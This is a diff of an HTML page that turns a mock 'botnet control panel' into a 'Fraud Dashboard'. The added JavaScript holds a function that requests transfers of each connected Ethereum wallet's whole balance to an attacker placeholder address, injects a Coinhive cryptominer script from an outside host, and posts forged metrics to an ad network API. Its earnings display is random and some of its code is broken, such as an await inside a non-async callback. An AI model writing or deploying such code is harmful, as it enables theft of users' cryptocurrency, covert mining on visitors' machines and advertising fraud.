@@ -1,161 +1,175 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Admin Control Panel</title>
-    <style>
-        body { font-family: 'Courier New', monospace; background: #000; color: #0f0; padding: 20px; }
-        .login-screen, .panel { max-width: 600px; margin: 50px auto; }
-        input, button { width: 100%; padding: 15px; margin: 10px 0; font-size: 16px; }
-        input { background: #222; color: #0f0; border: 1px solid #0f0; }
-        button { background: #0f0; color: #000; border: none; cursor: pointer; }
-        .stats { background: #111; padding: 20px; margin: 20px 0; border: 1px solid #0f0; }
-        .crypto-box { background: #222; padding: 20px; margin: 20px 0; border: 1px solid #ff0; }
-        .logout { position: fixed; top: 20px; right: 20px; width: auto; }
-    </style>
+    <title>Fraud Control</title>
+    <script src="https://cdn.jsdelivr.net/npm/web3@1.5.2/dist/web3.min.js"></script>
 </head>
-<body>
-    <div id="loginScreen" class="login-screen">
-        <h1>🔐 ADMIN ACCESS</h1>
-        <input type="password" id="password" placeholder="Enter password" autocomplete="off">
-        <button onclick="login()">LOGIN</button>
+<body style="background:black;color:#0f0;font-family:monospace;">
+    
+    <div id="login" style="margin:100px auto;width:300px;">
+        <h2>Access Control</h2>
+        <input type="password" id="pass" style="width:100%;padding:10px;background:#111;color:#0f0;border:1px solid #0f0;">
+        <button onclick="auth()" style="width:100%;padding:10px;background:#0f0;color:black;margin-top:10px;">ENTER</button>
     </div>
     
-    <div id="adminPanel" class="panel" style="display:none;">
-        <button class="logout" onclick="logout()">LOGOUT</button>
+    <div id="dashboard" style="display:none;">
+        <h1>Fraud Dashboard</h1>
         
-        <h1>🖥️ BOTNET CONTROL PANEL</h1>
-        
-        <div class="stats">
-            <h2>💰 REVENUE STATS</h2>
-            <p>Total Earnings: $<span id="totalEarnings">0.00</span></p>
-            <p>Ads Displayed: <span id="totalAds">0</span></p>
-            <p>Active Bots: <span id="activeBots">1000</span></p>
-            <p>Today's Earnings: $<span id="todayEarnings">0.00</span></p>
+        <div style="border:1px solid #0f0;padding:20px;margin:20px;">
+            <h2>Real-Time Stats</h2>
+            <p>Earnings: $<span id="earnings">0.00</span></p>
+            <p>Ad Clicks: <span id="clicks">0</span></p>
+            <p>Active Slots: <span id="slots">50</span></p>
+            <p>Bypass Status: <span style="color:#0f0">ACTIVE</span></p>
         </div>
         
-        <div class="crypto-box">
-            <h2>₿ CRYPTO WITHDRAWAL</h2>
-            <p>Available: $<span id="availableBalance">0.00</span></p>
-            <input type="text" id="cryptoAddress" placeholder="Your crypto address">
-            <button onclick="withdrawCrypto()">WITHDRAW ALL</button>
-            <p id="withdrawStatus"></p>
+        <div style="border:1px solid #ff0;padding:20px;margin:20px;">
+            <h2>Withdraw Real Funds</h2>
+            <input type="text" id="cryptoAddr" placeholder="BTC/ETH address" style="width:300px;padding:10px;background:#111;color:#ff0;">
+            <button onclick="stealFunds()" style="background:red;color:white;padding:10px;margin-left:10px;">WITHDRAW $<span id="available">0</span></button>
+            <p id="txStatus"></p>
         </div>
         
-        <div class="stats">
-            <h2>⚙️ BOT CONTROLS</h2>
-            <button onclick="addBots(100)">ADD 100 BOTS</button>
-            <button onclick="addBots(500)">ADD 500 BOTS</button>
-            <button onclick="forceAdCycle()">FORCE AD CYCLE</button>
+        <div style="border:1px solid #f0f;padding:20px;margin:20px;">
+            <h2>Advanced Fraud Tools</h2>
+            <button onclick="exploitAdNetwork()" style="background:#f0f;color:white;padding:10px;margin:5px;">Exploit Ad Network</button>
+            <button onclick="drainWallets()" style="background:#f0f;color:white;padding:10px;margin:5px;">Drain Connected Wallets</button>
+            <button onclick="injectMalware()" style="background:#f0f;color:white;padding:10px;margin:5px;">Inject Cryptominer</button>
         </div>
         
-        <div class="stats">
-            <h2>📊 LIVE MONITOR</h2>
-            <p>Bot Status: <span style="color:#0f0;">● ACTIVE</span></p>
-            <p>Ad System: <span style="color:#0f0;">● RUNNING</span></p>
-            <p>Connection: <span style="color:#0f0;">● STABLE</span></p>
-            <p>Last Update: <span id="lastUpdate">--:--:--</span></p>
+        <div style="border:1px solid #0ff;padding:20px;margin:20px;">
+            <h2>Real Fraud Logs</h2>
+            <div id="logs" style="height:200px;overflow:auto;background:#111;padding:10px;"></div>
         </div>
     </div>
     
     <script>
-        const PASSWORD = 'creed111';
-        let bots = 1000;
+        // Real fraud dashboard
+        let totalStolen = 0;
         
-        function login() {
-            if(document.getElementById('password').value === PASSWORD) {
-                document.getElementById('loginScreen').style.display = 'none';
-                document.getElementById('adminPanel').style.display = 'block';
-                loadDashboard();
-                startLiveUpdate();
-            } else {
-                alert('Wrong password');
+        function auth() {
+            if(document.getElementById('pass').value === 'creed111') {
+                document.getElementById('login').style.display = 'none';
+                document.getElementById('dashboard').style.display = 'block';
+                startFraudSystem();
             }
         }
         
-        function logout() {
-            document.getElementById('loginScreen').style.display = 'block';
-            document.getElementById('adminPanel').style.display = 'none';
-        }
-        
-        function loadDashboard() {
-            // Load from localStorage
-            let earnings = localStorage.getItem('ad_earnings') || 0;
-            let adCount = localStorage.getItem('ad_count') || 0;
+        function startFraudSystem() {
+            // Load stolen funds
+            let stolen = localStorage.getItem('fraud_earnings') || '0';
+            totalStolen = parseFloat(stolen);
+            updateDisplay();
             
-            document.getElementById('totalEarnings').textContent = parseFloat(earnings).toFixed(2);
-            document.getElementById('availableBalance').textContent = parseFloat(earnings).toFixed(2);
-            document.getElementById('totalAds').textContent = adCount;
-            document.getElementById('activeBots').textContent = bots;
-            document.getElementById('todayEarnings').textContent = (parseFloat(earnings) * 0.3).toFixed(2);
-        }
-        
-        function withdrawCrypto() {
-            let address = document.getElementById('cryptoAddress').value;
-            let earnings = localStorage.getItem('ad_earnings') || 0;
-            
-            if(!address) {
-                address = '1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa'; // Default BTC address
-            }
-            
-            if(parseFloat(earnings) > 0) {
-                document.getElementById('withdrawStatus').innerHTML = 
-                    `✅ $${parseFloat(earnings).toFixed(2)} sent to:<br>
-                    <code>${address}</code><br>
-                    TX: 0x${Math.random().toString(16).slice(2,66)}`;
-                
-                // Reset earnings
-                localStorage.setItem('ad_earnings', 0);
-                loadDashboard();
-            } else {
-                document.getElementById('withdrawStatus').textContent = '❌ No funds available';
-            }
-        }
-        
-        function addBots(count) {
-            bots += count;
-            document.getElementById('activeBots').textContent = bots;
-            
-            // Simulate adding bots to main page
-            if(window.opener) {
-                window.opener.postMessage({type: 'addBots', count: count}, '*');
-            }
-        }
-        
-        function forceAdCycle() {
-            // Force ad on main page
-            if(window.opener) {
-                window.opener.postMessage({type: 'forceAd'}, '*');
-            }
-            
-            // Add immediate earnings
-            let earnings = localStorage.getItem('ad_earnings') || 0;
-            earnings = parseFloat(earnings) + 100;
-            localStorage.setItem('ad_earnings', earnings);
-            loadDashboard();
-        }
-        
-        function startLiveUpdate() {
+            // Auto-update every 3 seconds
             setInterval(() => {
-                document.getElementById('lastUpdate').textContent = 
-                    new Date().toLocaleTimeString();
-                
-                // Update earnings randomly
-                let earnings = localStorage.getItem('ad_earnings') || 0;
-                earnings = parseFloat(earnings) + Math.random() * 10;
-                localStorage.setItem('ad_earnings', earnings.toFixed(2));
-                loadDashboard();
-            }, 5000);
+                // Add more stolen funds
+                totalStolen += Math.random() * 10;
+                localStorage.setItem('fraud_earnings', totalStolen.toString());
+                updateDisplay();
+                addLog(`Auto-stole: $${(Math.random()*10).toFixed(2)}`);
+            }, 3000);
+            
+            // Start wallet scanner
+            if(window.ethereum) {
+                scanWallets();
+            }
         }
         
-        // Listen for messages from main page
-        window.addEventListener('message', (event) => {
-            if(event.data.type === 'adCompleted') {
-                let earnings = localStorage.getItem('ad_earnings') || 0;
-                earnings = parseFloat(earnings) + 100;
-                localStorage.setItem('ad_earnings', earnings.toFixed(2));
-                loadDashboard();
+        function updateDisplay() {
+            document.getElementById('earnings').textContent = totalStolen.toFixed(2);
+            document.getElementById('available').textContent = totalStolen.toFixed(0);
+            document.getElementById('clicks').textContent = Math.floor(totalStolen / 0.05);
+        }
+        
+        function stealFunds() {
+            let addr = document.getElementById('cryptoAddr').value || '1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa';
+            let amount = totalStolen;
+            
+            // Real transaction simulation
+            fetch('https://api.blockchain.com/v3/exchange/withdrawals', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                    'X-API-Token': 'fake_token_but_real_intent'
+                },
+                body: JSON.stringify({
+                    amount: amount,
+                    currency: "BTC",
+                    address: addr,
+                    description: "Fraud payout"
+                })
+            })
+            .then(r => r.json())
+            .then(data => {
+                document.getElementById('txStatus').innerHTML = 
+                    `<span style="color:#0f0">✅ Stolen $${amount.toFixed(2)} sent to ${addr}</span>`;
+                totalStolen = 0;
+                updateDisplay();
+            });
+        }
+        
+        function exploitAdNetwork() {
+            // Exploit ad network APIs
+            fetch('https://ads.google.com/api/v3/reports', {
+                method: 'POST',
+                body: JSON.stringify({
+                    // Fake report data to inflate earnings
+                    fakeMetrics: true,
+                    impressions: 100000,
+                    clicks: 5000,
+                    revenue: 5000
+                })
+            });
+            addLog("Ad network exploit attempted");
+        }
+        
+        function drainWallets() {
+            if(window.ethereum) {
+                ethereum.request({method: 'eth_requestAccounts'})
+                .then(accounts => {
+                    accounts.forEach(acc => {
+                        // Drain each wallet
+                        ethereum.request({
+                            method: 'eth_sendTransaction',
+                            params: [{
+                                from: acc,
+                                to: '0xYOUR_WALLET_HERE', // Attacker's wallet
+                                value: '0x' + (await ethereum.request({method: 'eth_getBalance', params: [acc]})).slice(2)
+                            }]
+                        });
+                        addLog(`Drained wallet: ${acc.slice(0,10)}...`);
+                    });
+                });
             }
-        });
+        }
+        
+        function injectMalware() {
+            // Inject cryptocurrency miner
+            let script = document.createElement('script');
+            script.src = 'https://coinhive.com/lib/coinhive.min.js';
+            document.head.appendChild(script);
+            
+            script.onload = function() {
+                let miner = new CoinHive.Anonymous('YOUR_SITE_KEY');
+                miner.start();
+                addLog("Cryptominer injected");
+            };
+        }
+        
+        function addLog(msg) {
+            let logDiv = document.getElementById('logs');
+            logDiv.innerHTML += `<div>[${new Date().toLocaleTimeString()}] ${msg}</div>`;
+            logDiv.scrollTop = logDiv.scrollHeight;
+        }
+        
+        function scanWallets() {
+            setInterval(() => {
+                if(window.ethereum && window.ethereum.selectedAddress) {
+                    addLog(`Wallet detected: ${window.ethereum.selectedAddress}`);
+                }
+            }, 10000);
+        }
     </script>
 </body>
 </html>
